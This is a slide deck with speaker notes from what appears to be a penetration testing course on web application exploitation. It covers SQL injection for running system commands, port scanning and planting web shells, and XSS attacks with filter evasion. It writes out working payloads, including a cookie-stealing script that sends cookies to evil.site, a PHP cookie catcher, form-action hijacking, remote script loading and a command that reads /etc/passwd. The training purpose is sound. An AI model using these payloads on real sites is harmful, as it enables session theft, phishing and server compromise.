<!--[Rectangle 3]-->
- Uses the **system **function
- Results do not echo to the screen
	- Similar to MS SQL
- We run the commands with the privileges PostGRES is running with  
**SELECT system('cat /etc/passwd > /tmp/results.txt');**** **

Note:
<!--[Rectangle 7]-->
35

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
PostGRES uses the system function during queries to execute system commands.  These commands are limited to what the PostGRES user has permission to run.  As with previous command execution, the results are not displayed to the screen and need to be retrieved in another fashion.

---

<!-- Slide 36 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	- *** ***<span style="text-decoration: underline;">***Port Scanning with SQL Injection***</span>
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Now we will explore port scanning using MSSQL.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 37 -->
<!--[Rectangle 2]-->
Port Scanning

<!--[Rectangle 3]-->
- MS SQL can be used to port scan a network
- We use the OPENROWSET command
	- This is specific to MSSQL
- SQL injection can then map your network

Note:
<!--[Rectangle 7]-->
37

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
One of the more interesting features of MS SQL is using the database to port scan a network.  This uses the ability within SQL Server to open a query to a remote database server.  By controlling this query, the attacker is able to determine which ports are open on which machines.

---

<!-- Slide 38 -->
<!--[Rectangle 2]-->
Port Scanning Example

<!--[Rectangle 3]-->
- We can inject the following command
- Code to inject:
	- Select * from OPENROWSET ('SQLoledb', 'uid=sa; pwd=; Network=DBNETLIB; Address=10.5.42.1,80; timeout=5', 'select * from table')
	- We do not need to have real credentials
- To determine the state of the port, look at the error message:
	- Closed:
		- "SQL Server does not exist or access denied"
	- Open:
		- "OLE DB provider 'sqloledb' reported an error."

Note:
<!--[Rectangle 7]-->
38

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This example will try to connect to 10.5.42.1 on port 80.  If the error "SQL Server does not exist or access denied" is returned, the port is closed.  If "OLE DB provider 'sqloledb' reported an error" is returned, then the port is open and available for further attacks.

---

<!-- Slide 39 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	- *** ***<span style="text-decoration: underline;">***File Injection with SQL Injection***</span>
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The next attack is file injection using SQL injection.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 40 -->
<!--[Rectangle 2]-->
File Injection

<!--[Rectangle 3]-->
- File injection using SQL injection becomes a pivot point
- Keep in mind that SQL queries can contain user controlled data
	**select "Kevin";**
		- Returns a record set containing the string Kevin
- We can use this in combination with writing to files

Note:
<!--[Rectangle 7]-->
40

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
One of the nice parts of SQL is that we can perform queries where we control the contents of the results.  For example if we select a string from a table, the resulting record set is that string.  If we make use of this and write the result to a file, we are able to create scripts and applications onto the DB server.  

---

<!-- Slide 41 -->
<!--[Rectangle 2]-->
File Injection Examples

<!--[Rectangle 3]-->
- Two options for what we would write:
- Scripts
	- Inject a script
	- Call it from OS interaction
- Web Pages
	- Build php/asp/cfm script
	- Call it from the web
		- May need to hook a client via XSS

Note:
<!--[Rectangle 7]-->
41

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Two different methods can be used if you are able to write to a file.

The first is to create a script.  This script would be different based on the OS.  For example you would use BASH scripts for Linux and VBS scripts for Windows.  These scripts would then be called using further SQL injection attacks.

The second is to work with the web server that is installed on so many of the database servers today.  By writing a file to the web root, the file can then be called using a simple web browser.  If the database server is not accessible via a web browser from where you are located, using XSS to hook a client within the target network would provide you this access.  More on hooking browsers later today.

---

<!-- Slide 42 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	- *** ***<span style="text-decoration: underline;">***Prepared Injection Files***</span>
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next section we are going to explore some of the pre-written injection files and how they work.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 43 -->
<!--[Rectangle 2]-->
Prepared Injection Files

<!--[Rectangle 3]-->
- Many files are available for use
- Most were not created for SQL injection
	- But they can be used that way
- Shell access is a primary goal
- Two prepackaged shells
	- phpshell
	- Ajaxshell
- Laudanum is a collection of these types of files

Note:
<!--[Rectangle 7]-->
43

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Instead of building files to perform various functions, let's just use web applications built for this purpose.  There are as many as you can possibly imagine available, but since shell access is golden, let's go there.

We are going to look at two different pre-built web shells: 
	phpshell and ajaxshell

---

<!-- Slide 44 -->
<!--[Rectangle 2]-->
PHPShell

<!--[Rectangle 3]-->
- PHPShell is a web based shell
	- http://phpshell.  
sourceforge.net
- Made up of two files
	- phpshell.php
		- Contains the main shell
	- config.php
		- Usernames
		- Command Aliases

<!--[Picture 3]-->

Note:
<!--[Rectangle 7]-->
44

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
PHPshell is available at phpshell.sourceforge.net.  It is a simple script that was originally designed to assist in managing servers.  While it is more complex to inject since it is made up of two files, it has a feature that makes it quite nice.  The config.php file includes the ability to alias commands.  This enables you to bypass IDS devices that look for commands such as "id" or similar.

As you can see from the screen shot above, once you are logged in, the application is simple to use.  It presents you with a large text area where commands are entered.  After either pressing enter or clicking the execute button, the command runs.  Results from the command are then echoed to the screen.

---

<!-- Slide 45 -->
<!--[Rectangle 2]-->
AJAXShell

<!--[Rectangle 3]-->
- A easier to use shell by IronFist
- Single File to inject
- The interface includes buttons for commonly used commands
	- Verify the ability to run
	- Gathering server info
	- Read /etc/passwd

<!--[Picture 1]-->

Note:
<!--[Rectangle 7]-->
45

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
AJAXshell is a much more powerful shell.  It is a single file that can be uploaded to a server and has many built in features.  While it can accomplish the basic things such as running commands.  It also includes a pretty powerful file browser and upload functionality.

As you can see from the screenshot above, AJAXShell has adopted the "L33T" black look and feel.  The menu across the top of the screen gives you most of the access you need.  While the menu along the left side provides access to macro functions such as gathering server info and reading /etc/passwd.

---

<!-- Slide 46 -->
<!--[Title 1]-->
# Laudanum


<!--[Content Placeholder 2]-->
- Laudanum is a collection of these files
	- Released by Kevin Johnson of Secure Ideas   
and Justin Searle of UtiliSec
	- http://laudanum.secureideas.com
- Contains multiple functions
	- DNS lookups
	- Proxying requests
	- Shells
- Scope limiting features are in place
	- Authorization based on usernames
	- Only allow certain IPs to access the file
		- Returns a 404 otherwise

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Laudanum is a collection of these files.  It was originally released at DefCon 17 in 2009 and the team writing it has grown beyond the original members.

Laudanum is attempting to include many different functions in one package.  These range from shells to utilities like DNS lookups and mounting shares to proxying network requests.  These are written to support web scripting languages such as ASP, ColdFusion, PHP and Java.

The real differentiator between Laudanum and other packages is the scope limiting features.  All of the scripts include some form of authorization.  This may be a user name and password or restrictions based on IP addresses.  If your client is not authorized, you receive a 404 status code to prevent attackers from detecting the existence of the file.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 47 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	- *** ***<span style="text-decoration: underline;">***sqlmap Exercise***</span>
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We are now going to explore sqlmap, a tool we discussed on day three.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 48 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	- *** ***<span style="text-decoration: underline;">***Blind SQL Injection***</span>
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will discuss blind SQL injection.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 49 -->
<!--[Rectangle 2]-->
Blind SQL Injection

<!--[Rectangle 3]-->
- Most attacks are the same as with SQL injection
- Errors are just not displayed
- Data return becomes more complex
	- Use other protocols for data egress
		- HTTP
		- DNS
		- E-mail

Note:
<!--[Rectangle 7]-->
49

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Blind SQL injection is similar to SQL Injection, except that the results are not displayed. Without the error messages, it takes more effort to get working attacks.  Since the display is intercepted by the application, the attacker must run commands that either do not require visible results, such as adding a user, or the results must be sent to the attacker using some functionality within the database.  One example of this is "UTL_MAIL" in Oracle.  This is a stored procedure that will send e-mail from the database.

---

<!-- Slide 50 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- *** ***<span style="text-decoration: underline;">***Blind SQL Injection Exercise***</span>
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The next attack is file injection using a combination of SQL injection and blind SQL injection.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 51 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	- *** ***<span style="text-decoration: underline;">***XSS***</span>
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next topic is cross site scripting.  This is actually where we will spend quite a bit of time today since XSS can be one of the more powerful attacks to perform.  It is also one of the more common ones to find due to most people misunderstanding what it can accomplish.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 52 -->
<!--[Rectangle 2]-->
Cross Site Scripting

<!--[Rectangle 3]-->
- Should be called Script injection
- Targets the client using the application
- Two types of XSS
	- Persistent
	- Reflective

Note:
<!--[Rectangle 7]-->
52

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Cross Site Scripting (XSS) was originally called "script injection," which is an appropriate name. It simply means that an attacker has the ability to inject a script and have the browser run it. It does not require the involvement of multiple web sites, as the name implies. 

There are two types of XSS which we will discuss: persistent and reflective. There is also a third type of Cross Site Scripting, but it has nothing to do with web applications. For your information, it is called "Local DOM-based" XSS. This is when you attack a non-web application client using JavaScript. 

---

<!-- Slide 53 -->
<!--[Rectangle 2]-->
POST XSS Flaws

<!--[Rectangle 3]-->
- The HTTP POST method does not use the URL for parameters
	- This makes XSS harder to demonstrate
- Tools are available to redirect HTTP GET requests to HTTP POST
- This allows us to build a link to demonstrate the flaw
- Secure Ideas has released a demo of this type of tool
	- Its available at http://www.secureideas.net/tools
	- Install this on a server we control!

Note:
<!--[Rectangle 7]-->
53

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
When the GET method is used, all of the parameters are conveniently submitted in the URL. With a POST request, the variables are in the payload of the request. POST requests are still vulnerable to XSS, but attacks are harder to demonstrate because we have to configure a client to send the HTTP POST and build the payload. It is not very easy to include POST payloads in a report and have a reader execute it.

Alternatively, there is a tool available from Secure Ideas.  This file is available from http://www.secureideas.net/tools and we can install it onto a server we control.

---

<!-- Slide 54 -->
<!--[Rectangle 2]-->
Typical Exploits with XSS

<!--[Rectangle 3]-->
- There are a number of typical attacks
	- Reading Cookies
	- Redirecting a user
	- Modifying content on a page
- XSS allows for running any client-side code
	- Remember it can use any supported client-side technology

Note:
<!--[Rectangle 7]-->
54

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Some of the typical exploits used with XSS are reading cookies and redirecting a user to another page.  You are also able to modify the content of a page and run pretty much any custom code within the JavaScript language.

---

<!-- Slide 55 -->
<!--[Rectangle 2]-->
Reading Cookies

<!--[Rectangle 3]-->
- Code to steal cookies
**<script>document.write('  
<img src="http://evil.site/'+document.cookie+'">')  
</script>**
- Creates an image tag on the page
- Sends a request to our site that includes cookies from the vulnerable site
- Our HTTP logs includes this information

Note:
<!--[Rectangle 7]-->
55

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Cookies hold valuable information about a user's session. This could include the session ID or session token, as we discussed on Day 1, or sensitive information that an application has incorrectly stored on a client. 

The code in this slide is designed to steal cookie information from a client and send it to an attacker's web site.

You will notice that the script includes an image tag, which is written to the screen within the targeted application. The image tag sets the source of the image to an evil site, and appends the value of the cookie to the URL. If the value of the cookie was a session ID- for example, 42- then the URL would become: 
http://evil.site/42 

At that point, the user's browser automatically attempts to load the image. The image will fail to load (it could appear as a red X, but if the pixel size is set to 1x1, the user won't see it at all). This request will appear in the evil.site logs. The evil.site administrator will find a "404" error message, which contains the value of the cookie as part of the requested address.  Then, all the evil site administrator needs to do is parse the site logs to get the cookies. 

The upshot is that this script causes a user's data to be transmitted to the evil site via HTTP requests. 




---

<!-- Slide 56 -->
<!--[Rectangle 2]-->
Cookie Catcher

<!--[Rectangle 3]-->
- We can also include a cookie catcher script on our server
- This code logs the cookies in a simpler format
	- We don't have to parse the web server logs
**<?php**
**$cookies = $_SERVER['REQUEST_URI'];**
**$output = "Received=".$cookies."\n";**
**$fh = fopen("/tmp/cookiedump", "a+");**
**$contents = fwrite($fh, $output);**
**fclose($fh);**
**?>**

Note:
<!--[Rectangle 7]-->
56

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The above code, written by Tom Liston, would run on a server controlled by the attacker.  It reads the cookie value from the request and logs them to /tmp/cookiedump.

This code could be updated to log further information or even make a web request using the cookies stolen.  The web request would go to the site in the referer header. ?

We used this type of code during the XSS exercise on day 3.

---

<!-- Slide 57 -->
<!--[Rectangle 2]-->
Redirecting a User

<!--[Rectangle 3]-->
- We can also inject code to redirect a user
**<script language="javascript">  
window.location.href = "http://professionallyevil.com" ;   
</script> **
- We can also change the form action to have it submit to us
**document.forms[1].action="http://www.PEWAPT.org/"**

Note:
<!--[Rectangle 7]-->
57

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The JavaScript shown above instructs the browser to change the location it is displaying. In this example, the location changes to otherpage.html. However, the location can be any page or site on the Internet.

Using redirection, an attacker can control where on the Internet a user is visiting. Phishing sites use this type of an attack, by having the victim visit the actual trusted site (which happens to be vulnerable to XSS), and then redirecting the user to a different site. 

Note that if we are able to inject redirection code, we can inject code that changes where a user's login form is submitted. The user could actually be at their bank's web site, but because it is vulnerable to XSS, instead of submitting the form to the bank it actually submits it to the attacker's web site. 

---

<!-- Slide 58 -->
<!--[Rectangle 2]-->
External Scripts

<!--[Rectangle 3]-->
- Example show injecting scripts directly
	- Small scripts work but are limited by the size of the input
- Loading remote scripts allows us to include premade attacks
- It is simple to load a remote file
	<script src="http://evil.site/bad.js">  
</script>

Note:
<!--[Rectangle 7]-->
58

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
All of the examples we've discussed so far today are small script injections. The entire script can be loaded into an input field. However, it's hard to do really malicious things with 100 characters. JavaScript solves that problem for us, by giving us the ability to load a script from a remote site. 

---

<!-- Slide 59 -->
<!--[Rectangle 2]-->
Evasion

<!--[Rectangle 3]-->
- It is more common now for sites to filter input
- Typically this is done by blacklisting strings
- Trivial to bypass in most cases
- Here are some examples of evasion techniques

Note:
<!--[Rectangle 7]-->
59

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Many sites are configured to automatically block known malicious inputs. These blacklists are often trivial to bypass. Since the JavaScript and HTML languages are designed for flexibility, there are a plethora of ways to represent the same data, which can allow us to evade blocking mechanisms.

The premier site for XSS evasion techniques is the XSS cheatsheet at http://ha.ckers.org/xss.html


---

<!-- Slide 60 -->
<!--[Rectangle 2]-->
Evasion Example (1)

<!--[Rectangle 3]-->
- The following are version of the traditional attack:
<SCRIPT>alert("XSS")</SCRIPT>
- Image Tag
<IMG SRC="javascript:alert('XSS');">
- Malformed IMG Tag
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

Note:
<!--[Rectangle 7]-->
60

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
On Day 3, we proved the existence of a XSS vulnerability using the simple example shown first on this slide. It is a typical XSS demonstration, in which JavaScript is used to open an alert box that says "XSS" with an "OK" button. 

Two of the ways to change this to bypass filtering are shown. One method uses an image tag. Notice that the image source is the JavaScript. The other method uses a malformed image tag, which most modern browsers will render despite the fact that it is not valid. 

---

<!-- Slide 61 -->
<!--[Rectangle 2]-->
Evasion Example (2)

<!--[Rectangle 3]-->
- The following are version of the traditional attack:
<SCRIPT>alert("XSS")</SCRIPT>
- HTML Entities
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
- Hex Encoding
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

Note:
<!--[Rectangle 7]-->
61

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
On this slide we have included two more methods of encoding the script to bypass filters.  

The first makes use of HTML entities.  In this case the entities are &quot;.

The second example uses hex encoding to write the various characters.

---

<!-- Slide 62 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- *** ***<span style="text-decoration: underline;">***Persistent XSS Exercise***</span>
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this exercise we will attack PHPBB with a persistent XSS attack.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 63 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	- *** ***<span style="text-decoration: underline;">***Advanced XSS***</span>
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We will now look into some more advanced XSS attacks.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 64 -->
<!--[Rectangle 2]-->
Advanced Script Injection

<!--[Rectangle 3]-->
- We have looked at some basic examples
- Now we are going to explore more advanced examples
- We will also explore an exploitation tool named Durzosploit
- With these attacks the sky is the limit
- . We are limited only by our imagination

Note:
<!--[Rectangle 7]-->
64

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The examples we have studied so far are very simple. They do not leverage the full power and imagination of malicious attackers. JavaScript is a full-blown programming language, and because of that, we are limited primarily by our imaginations. 

In the next slides, we will study some more advanced examples of XSS.

---

<!-- Slide 65 -->
<!--[Rectangle 2]-->
Port Scanner

<!--[Rectangle 3]-->
- Uses hidden IFRAMEs
- Source of IFRAME is an internal IP
- If onload() fires; Port is open
- Code then changes source of the iframe

<!--[Picture 3]-->

Note:
<!--[Rectangle 7]-->
65

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Our first example of an advanced exploit is the implementation of a port scanner using JavaScript and IFRAMES. 

A frameset in HTML is an old technology which allows the screen to be split into multiple frames, which each loads a separate HTML source.  IFRAMEs are based off of this concept. Using IFRAMEs, a web site developer can load a separate web page within a web page that a user has loaded. It is possible to set an IFRAME's visibility to "hidden," which means that the page will be loaded but not displayed. By adding a script to an IFRAME, we can insert scripts which are executed in the user's browser. 

We can use this to conduct internal port scanning. First, we determine the internal IP address range of the client system. (This will be explained on the next slide.) Next, we create a hidden IFRAME. The hidden IFRAME's source references another IP address within the internal address space. For example, if the client IP address is 10.0.0.3, the script might use 10.0.0.4. This will attempt to load a web page from the address 10.0.0.4. If the JavaScript "onload" action successfully executes, then the port is open.  By walking the full address space, we can compile a list of systems on the network that have port 80 open. 

---

<!-- Slide 66 -->
<!--[Rectangle 2]-->
Internal Addresses

<!--[Rectangle 3]-->
- Internal addresses are needed to perform these scans
- This would allow further network exploitation
- Java Applet is required as JavaScript can't access IP
- MyAddress.class is one example
	- Lars Kinderman
	- http://reglos.de/myaddress/

Note:
<!--[Rectangle 7]-->
66

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Retrieving the internal address of the browser will allow the attacker to further attack the network the browser is on.  To get this address from JavaScript, the attacker needs to use a Java applet.  One of the best is MyAddress.class by Lars Kinderman.

---

<!-- Slide 67 -->
<!--[Rectangle 2]-->
Using MyAddress.class

<!--[Rectangle 3]-->
1. Create a MyAddress() JavaScript function
2. Load the MyAddress.class file using an APPLET tag
3. JavaScript now has the IP address

Note:
<!--[Rectangle 7]-->
67

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The first thing the attacker must do is create a MyAddress function in JavaScript.  This function accepts the IP as a parameter and does whatever the attacker would like.

Second, they load the MyAddress.class file. (The example below shows how.)

At this time the JavaScript code has access to the IP address!

Example:
	JavaScript Function:
		<script> function MyAddress(IP) { alert("Your local IP is " + IP) } </script> 
	Applet Loading Code:
		<APPLET CODE="MyAddress.class" MAYSCRIPT WIDTH=0 			HEIGHT=0></APPLET> 
		(The MAYSCRIPT parameter is how this is enabled.)

---

<!-- Slide 68 -->
<!--[Rectangle 2]-->
